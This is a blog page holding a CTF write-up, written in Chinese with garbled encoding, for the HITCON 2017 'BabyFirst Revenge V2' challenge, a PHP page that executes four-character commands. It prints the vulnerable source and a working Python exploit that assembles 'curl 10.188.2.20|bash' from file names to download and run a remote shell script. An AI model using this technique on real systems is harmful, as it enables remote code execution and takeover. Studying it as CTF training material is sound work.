<!DOCTYPE html>
<html lang="pt">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>[hitcon2017] BabyFirst Revenge V2å¤ç° | Pr0ph3t's blog</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="https://libs.cdnjs.net/fancybox/3.5.7/jquery.fancybox.min.css">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    <link rel="shortcut icon" href="/assets/images/favicon.png">

    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 

</head>


    <body>
      <div class="container">

        <header class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <h1 class="">Pr0ph3t</h1>
    <p>
    <span class="reserved">char</span> nick[<span class="number">7</span>] = <span class="string">"Pr0ph3t"</span>;
    </p>
    <p>
    printf(<a href="https://github.com/t3hp0rP" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
    </p>
    <p>
    printf(<span class="string">"<span class="reserved">%s\x40</span>pr0ph3t<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,<span class="string">"admin"</span>);
    </p>
    <!-- <p>
            printf(<a href="https://blog.pr0ph3t.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.pr0ph3t.com<span class="reserved">\n</span>"</span></a>,nick);
        </p> -->
    <p>
    puts(<a href="/assets/misc/pubkey.gpg.txt" target="_blank"><span class="string">"91B6Â 191AÂ C2C3Â 285CÂ 201DÂ Â 801BÂ B5A3Â 6B56Â 8528Â E140"</span></a>);
    </p>
  </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu">
      <ul>
          <li><a href="/">home</a></li>
          <li><a href="/articles/">articles</a></li>
          <li><a href="/friendlink">friends</a></li>
      </ul>
    </div>
  </div>
</div>



        <div class="row">
          <div class="col-lg-8 col-lg-offset-2">
            <main>
            <div class="post">

  <header class="post-header">
    <h1>[hitcon2017] BabyFirst Revenge V2å¤ç°</h1>
  </header>

  <article class="post-content">
  <div class="post">

  <header class="post-header">
    <p class="meta">
        Nov 28, 2017
        
        
        â€¢
        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#hitcon" class="reserved">hitcon</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
        
          <span id="/posts/hitcon2017-BabyFirst-Revenge-V2%E5%A4%8D%E7%8E%B0/" class="leancloud_visitors" data-flag-title="[hitcon2017] BabyFirst Revenge V2å¤ç°">
            Page view:
            <span class="leancloud-visitors-count"></span>
          </span>
        
    </p>
  </header>

  <article class="post-content">
  <p>åˆ†äº«æœ¬é¢˜è‡ªåˆ¶Dockerfileï¼š<a href="https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge-v2">Github</a></p>

<p>è¿™é¢˜ç›¸æ¯”äºä¸Šä¸€é¢˜ æ¡ä»¶æ›´åŠ çš„è‹›åˆ»äº† åªå…è®¸æ‰§è¡Œæœ€å¤šå››ä¸ªå­—ç¬¦
æºç å¦‚ä¸‹ï¼š</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">'/www/sandbox/'</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"orange"</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]);</span>
    <span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
    <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'reset'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">'/bin/rm -rf '</span> <span class="o">.</span> <span class="nv">$sandbox</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
</code></pre></div></div>

<p>é‚£æˆ‘ä»¬ä¹‹å‰çš„ç”Ÿæˆ ls -t&gt;g å°±ä¸èƒ½æŒ‰ç…§æœ€åä¸€æ­¥ lsÂ»_ æ¥æ‰§è¡Œäº†</p>

<p>ä½†æ˜¯æˆ‘ä»¬èƒ½ä¸èƒ½è¿˜æ˜¯æŒ‰ç…§ ç”Ÿæˆå‘½ä»¤æ®µæ–‡ä»¶ æœ€åé€šè¿‡lsæ¥æ‹¼æ¥å‘½ä»¤æ‰§è¡Œå‘¢ï¼Ÿ</p>

<p>è¿™é‡Œè¿˜æ˜¯ä»¥åˆ†æOrangeå¤§å¤§çš„expä¸ºä¸»ï¼š</p>

<p>Exp:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">quote</span>

<span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>
    <span class="c1"># generate "g&gt; ht- sl" to file "v"
</span>    <span class="s">'&gt;dir'</span><span class="p">,</span> 
    <span class="s">'&gt;sl'</span><span class="p">,</span> 
    <span class="s">'&gt;g\&gt;'</span><span class="p">,</span>
    <span class="s">'&gt;ht-'</span><span class="p">,</span>
    <span class="s">'*&gt;v'</span><span class="p">,</span>

    <span class="c1"># reverse file "v" to file "x", content "ls -th &gt;g"
</span>    <span class="s">'&gt;rev'</span><span class="p">,</span>
    <span class="s">'*v&gt;x'</span><span class="p">,</span>

    <span class="c1"># generate "curl orange.tw|python;"
</span>    <span class="c1"># generate "curl 10.188.2.20|bash"
</span>    <span class="s">'&gt;\;</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;sh</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;ba</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;\|</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;20</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;2.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span>
    <span class="s">'&gt;8.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;18</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;0.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;1</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;\ </span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;rl</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;cu</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 

    <span class="c1"># got shell
</span>    <span class="s">'sh x'</span><span class="p">,</span> 
    <span class="s">'sh g'</span><span class="p">,</span> 
<span class="p">]</span>


<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:17528/?reset=1'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">4</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:17528/?cmd='</span> <span class="o">+</span> <span class="n">quote</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">)</span>
    <span class="k">print</span> <span class="n">i</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</code></pre></div></div>

<p>é¦–å…ˆç”Ÿæˆ ls -t &gt;gçš„å‘½ä»¤æ–‡ä»¶ï¼Œè¿™é‡Œorangeå¤§å¤§çš„æ–¹æ³•çœŸçš„å·§å¦™åˆ°æè‡´äº†ï¼</p>

<ul>
  <li>
    <p>å…ˆäº†è§£ä¸€ä¸ªå°trickï¼Œ<code class="highlighter-rouge">*</code>åœ¨Linuxä¸­ä»£è¡¨çš„æ˜¯0æˆ–å¤šä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚<code class="highlighter-rouge">ls *.txt</code> å°±è¡¨ç¤ºäº†åˆ—å‡ºæœ¬ç›®å½•ä¸‹æ‰€æœ‰åç¼€åä¸ºtxtçš„æ–‡ä»¶ï¼Œé‚£å‡å¦‚å•ç‹¬æ‰§è¡Œä¸€ä¸ª<code class="highlighter-rouge">*</code>ä¼šæ˜¯ä»€ä¹ˆæ•ˆæœï¼Ÿ
åœ¨æœ¬åœ°å°è¯•äº†ä¸€ä¸‹ ç›´æ¥è¾“å…¥ä¸€ä¸ªæ˜Ÿå·çš„è¯Linuxé¦–å…ˆä¼šæŠŠå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æŒ‰å­—å…¸åºæ’åºä¸€æ¬¡ï¼Œç„¶åå°†æ’åºçš„ç»“æœå½“ä½œå‘½ä»¤æ‰§è¡Œï¼Œå¦‚ä¸‹ï¼š
<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2å¤ç°/1.png" alt="ğŸŒ°" />
é‚£ä¸‹å›¾çš„ä¹Ÿå¯ä»¥ç†è§£äº†ï¼š
<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2å¤ç°/2.png" alt="ğŸŒ°" />
å› ä¸º*oåŒ¹é…äº† echo å’Œoï¼Œè€Œä»–ä»¬çš„æ’åºæ˜¯echoåœ¨å‰ï¼Œoåœ¨å æ‰€ä»¥å°±ä¼šæ‰§è¡Œå‘½ä»¤ echo o</p>
  </li>
  <li>
    <p>å†è®¤è¯†ä¸€ä¸‹dir è¿™ä¸ªå‘½ä»¤åœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­éƒ½æ˜¯ls çš„alias ä½†æ˜¯æœ‰äº›ç³»ç»Ÿä¸­åˆ™æ²¡æœ‰
ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ç”¨è¿™ä¸ªå‘½ä»¤å‘¢ å› ä¸ºä¹‹å‰è¯´è¿‡ls æ˜¯alphabetically ï¼ˆå­—å…¸åºï¼‰é‚£ä¹ˆdirå°±ä¼šæ’åœ¨lsç»“æœçš„æœ€å‰é¢ æ‰€ä»¥æˆ‘ä»¬*ä¹‹ådirä¹Ÿæ˜¯æ’åœ¨æœ€å‰é¢ ä¹Ÿå°±å……å½“äº†æ‹¼æ¥æ–‡ä»¶åçš„è§’è‰²</p>
  </li>
  <li>
    <p>å¤§æ¦‚æ€è·¯å°±å‡ºæ¥äº† æˆ‘ä»¬è¦æ„é€ ls -t&gt;gçš„å‘½ä»¤ç‰‡æ®µæˆå‡ ä¸ªæ–‡ä»¶å ä½†æ˜¯å…¶å‘½ä»¤æ®µçš„é¦–å­—æ¯ä¸èƒ½åœ¨dçš„å‰é¢ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½æ˜¯ <strong>ç‰¹æ®Šç¬¦å· æ•°å­— abc</strong> è€Œä¸”æ¯ä¸€æ®µä¸èƒ½è¶…è¿‡ä¸¤ä¸ªå­—ç¬¦ï¼Œå› ä¸ºå…¶ä½™ä¸¤ä¸ªå­—ç¬¦è¦åˆ†é…ç»™&gt;å’Œ\ï¼Œå¦‚æœä½ å°è¯•ä¸€ä¸‹æ„é€  æ­£å¸¸æ¥è¯´æ˜¯æ²¡åŠæ³•æ„é€ å‡ºæ— ç‰¹æ®Šç¬¦å·æ‰“å¤´çš„æ–‡ä»¶å ä»–æ€»ä¼šæ’åˆ°dirçš„å‰é¢ï¼Œç„¶åæ›´å·§å¦™çš„åœ°æ–¹æ¥äº† æˆ‘ä»¬å¯ä»¥ç”Ÿæˆé€†åºçš„å‘½ä»¤æ‹¼æ¥èµ·æ¥ï¼Œæœ€åä½¿ç”¨revå‘½ä»¤åå‘æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²ï¼</p>
  </li>
  <li>
    <p>æ ¹æ®ä¹‹å‰æˆ‘ä»¬å¯¹*çš„è®¤è¯†ï¼Œæˆ‘ä»¬å¯ä»¥å°†å€’åºçš„å‘½ä»¤è¾“å…¥åˆ°væ–‡ä»¶ä¸­ï¼Œå› ä¸º*vèƒ½åŒ¹é…rev å’Œ vï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œäº† rev vå‘½ä»¤ï¼Œç„¶åå†å°†å€’åºä¹‹åçš„ç»“æœ&gt;xæ–‡ä»¶ä¸­ï¼Œè¿™æ ·*v&gt;xåˆšåˆšå¥½æ˜¯å››ä¸ªå­—ç¬¦!</p>
  </li>
  <li>
    <p>ä½†æ˜¯çœ‹åˆ°è¿™é‡Œ ä½ å¯èƒ½è¿˜ä¼šåœ¨å°è¯•è¿‡ç¨‹ä¸­å‘ç°é—®é¢˜ï¼Œé‚£å°±æ˜¯é€†åºä¹‹åçš„å‘½ä»¤æ®µåº”è¯¥æ˜¯ [dir,&gt;sl,&gt;g&gt;,&gt;t-] é‚£ä¹ˆè¿™é‡Œä¼šæœ‰ä¸€ä¸ªé—®é¢˜ å› ä¸ºtçš„å­—æ¯åºæ¯”såï¼Œæ‰€ä»¥lsä¹‹ååº”è¯¥æ˜¯è¿™æ ·çš„ï¼š
<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2å¤ç°/3.png" alt="Oops" />
è§£å†³æ–¹æ³•æ˜¯åŠ å¤šä¸€ä¸ªå‚æ•°hï¼Œåœ¨lsä¸­hæ˜¯ç”¨ä½œæ ¼å¼åŒ–lå‚æ•°ä¹‹åçš„å­˜å‚¨é‡å¤§å° ä½¿ä¹‹æ›´é€‚åˆäººç±»æ–¹å¼é˜…è¯» ä½†æ˜¯å¦‚æœlsåªå¸¦å‚æ•°hçš„ä¸å¸¦å‚æ•°lè¯é‚£è¿™ä¸ªå‚æ•°æ˜¯æ¯«æ— æ„ä¹‰çš„ å¦‚å›¾ï¼š
<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2å¤ç°/4.png" alt="ğŸŒ°" />
æ‰€ä»¥æˆ‘ä»¬å°†&gt;t-æ”¹æˆ&gt;ht-å°±èƒ½è§£å†³å­—å…¸åºçš„é—®é¢˜äº†</p>
  </li>
  <li>
    <p>æ¥ä¸‹æ¥çš„é—®é¢˜å°±å›åˆ°äº†babyfirst-revengeçš„æƒ…å†µäº†</p>
  </li>
</ul>

<p>å‚è€ƒ:
https://github.com/orangetw/My-CTF-Web-Challenges</p>

  </article>

	<p class="feed-recomendation">
		Did you like the post? Subscribe to the <a href="/feed/">feed</a>.
	</p>

  <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'pr0ph3t';
    var disqus_config = function () {
        this.page.identifier = "/posts/hitcon2017-BabyFirst-Revenge-V2%E5%A4%8D%E7%8E%B0/";
    };
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




</div>

  </article>

</div>

            </main>
          </div>
        </div>

        <div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <footer>
      Thx!
    </footer>
  </div>
</div>
<script src="https://libs.cdnjs.net/jquery/3.3.1/jquery.min.js"></script>
<script src="https://libs.cdnjs.net/fancybox/3.5.7/jquery.fancybox.min.css"></script>
<script>
$(document).ready(function() {
	$("img").each(function() {
		var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
		$(this).wrapAll(strA);
    });
});
</script>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-87275583-1']);
  _gaq.push(['_trackPageview']);
 (function() {
   var ga = document.createElement('script');ga.type = 'text/javascript'; ga.async = true;
   ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
   var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>
    AV.initialize("FUf6n3OvGTkv0cqnGGbJyS5Q-MdYXbMMI", "FV3i9cojG6DyOMel86rUaaqR");
    AV.useAVCloudUS();
    //æ–°å¢è®¿é—®æ¬¡æ•°
    function addCount(Counter) {
      // é¡µé¢ï¼ˆåšå®¢æ–‡ç« ï¼‰ä¸­çš„ä¿¡æ¯ï¼šleancloud_visitors
      // idä¸ºpage.urlï¼Œ data-flag-titleä¸ºpage.title
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // åªæ ¹æ®æ–‡ç« çš„urlæŸ¥è¯¢LeanCloudæœåŠ¡å™¨ä¸­çš„æ•°æ®
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//è¯´æ˜LeanCloudä¸­å·²ç»è®°å½•äº†è¿™ç¯‡æ–‡ç« 
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("visited_times");// å°†ç‚¹å‡»æ¬¡æ•°åŠ 1
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                var newTimes = counter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            // æ‰§è¡Œè¿™é‡Œï¼Œè¯´æ˜LeanCloudä¸­è¿˜æ²¡æœ‰è®°å½•æ­¤æ–‡ç« 
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("post_title", title);// æŠŠæ–‡ç« æ ‡é¢˜
            newcounter.set("post_url", url); // æ–‡ç« url
            newcounter.set("visited_times", 1); // åˆå§‹ç‚¹å‡»æ¬¡æ•°ï¼š1æ¬¡
            newcounter.save(null, { // ä¸Šä¼ åˆ°LeanCloudæœåŠ¡å™¨ä¸­
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                var newTimes = newcounter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //ä»…æ ¹æ®urlå’ŒtitleæŸ¥å‡ºå½“å‰è®¿é—®æ¬¡æ•°ï¼Œä¸åš+1æ“ä½œ
    function showCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // åªæ ¹æ®æ–‡ç« çš„urlæŸ¥è¯¢LeanCloudæœåŠ¡å™¨ä¸­çš„æ•°æ®
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//è¯´æ˜LeanCloudä¸­å·²ç»è®°å½•äº†è¿™ç¯‡æ–‡ç« 
            var counter = results[0];
            var $element = $(document.getElementById(url));
            var newTimes = counter.get('visited_times');
            $element.find('.leancloud-visitors-count').text(newTimes);
          } else {
            //å¦‚æœè¡¨é‡Œæ²¡æŸ¥åˆ°è®°å½•ï¼Œé‚£å°±æ˜¯å¼‚å¸¸æƒ…å†µäº†
            console.log('å¼‚å¸¸æƒ…å†µï¼Œä¸åº”è¯¥æ²¡è®°å½•çš„');
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //è°ƒç”¨APIè·å–IP
    function getVisitorIpAndJudge() {
      var ip;
      var options = {
        type: 'GET',
        url: "https://ctf.pr0ph3t.com/"
      };
      $.ajax(options)
      .done(function(data, textStatus, jqXHR) {
        if(textStatus == "success") {
          ip = data.trim().split('<br>')[0];
        }
        judgeVisitor(ip)
      });
    }

    //åˆ¤æ–­è®¿å®¢æ˜¯å¦å·²è®¿é—®è¿‡è¯¥æ–‡ç« ï¼ŒåŠè®¿é—®æ—¶é—´ï¼Œç¬¦åˆæ¡ä»¶åˆ™å¢åŠ ä¸€æ¬¡è®¿é—®æ¬¡æ•°
    function judgeVisitor(ip) {
      var Counter = AV.Object.extend("visited_times");
      var Visitor = AV.Object.extend("visitors_record");

      var $postInfo = $(".leancloud_visitors");
      var post_url = $postInfo.attr('id').trim();

      var query = new AV.Query(Visitor);

      query.equalTo("visitor_ip", ip);
      query.equalTo("post_url", post_url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            console.log('è¯¥IPå·²è®¿é—®è¿‡è¯¥æ–‡ç« ');

            var oldVisitor = results[0];

            var lastTime = oldVisitor.updatedAt;
            var curTime = new Date();

            var timePassed = curTime.getTime() - lastTime.getTime();

            if(timePassed > 1 * 60 * 1000) {
              console.log('è·ç¦»è¯¥IPä¸Šä¸€æ¬¡è®¿é—®è¯¥æ–‡ç« å·²è¶…è¿‡äº†1åˆ†é’Ÿï¼Œæ›´æ–°è®¿é—®è®°å½•ï¼Œå¹¶å¢åŠ è®¿é—®æ¬¡æ•°');

              addCount(Counter);

              oldVisitor.fetchWhenSave(true);
              oldVisitor.save(null, {
                success: function(oldVisitor) { },
                error: function(oldVisitor, error) {
                  console.log('Failed to save visitor record, with error message: ' + error.message);
                }
              });
            } else {
              console.log('è¿™æ˜¯è¯¥IP 1åˆ†é’Ÿå†…é‡å¤è®¿é—®è¯¥æ–‡ç« ï¼Œä¸æ›´æ–°è®¿é—®è®°å½•ï¼Œä¸å¢åŠ è®¿é—®æ¬¡æ•°');
              showCount(Counter);
            }
          } else {
            console.log('è¯¥IPç¬¬ä¸€æ¬¡è®¿é—®è¯¥æ–‡ç« ï¼Œä¿å­˜æ–°çš„è®¿é—®è®°å½•ï¼Œå¹¶å¢åŠ è®¿é—®æ¬¡æ•°');

            addCount(Counter);

            var newVisitor = new Visitor();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newVisitor.setACL(acl);
            newVisitor.set("visitor_ip", ip);
            newVisitor.set("post_url", post_url);
            newVisitor.save(null, { // ä¸Šä¼ åˆ°LeanCloudæœåŠ¡å™¨ä¸­
              success: function(newVisitor) { },
              error: function(newVisitor, error) {
                console.log('Failed to create visitor record, with error message: ' + error.message);
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
          addCount(Counter);
        }
      });
    }

    $(function() {
      if ($('.leancloud_visitors').length == 1) {
        // æ–‡ç« é¡µé¢ï¼Œè°ƒç”¨åˆ¤æ–­æ–¹æ³•ï¼Œå¯¹ç¬¦åˆæ¡ä»¶çš„è®¿é—®å¢åŠ è®¿é—®æ¬¡æ•°
        getVisitorIpAndJudge();
      } else if ($('.post-link').length > 1){
        // é¦–é¡µ æš‚æœªä½¿ç”¨
        // showHitCount(Counter);
      }
    });
  </script>

<!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->

      </div>
    </body>
</html>
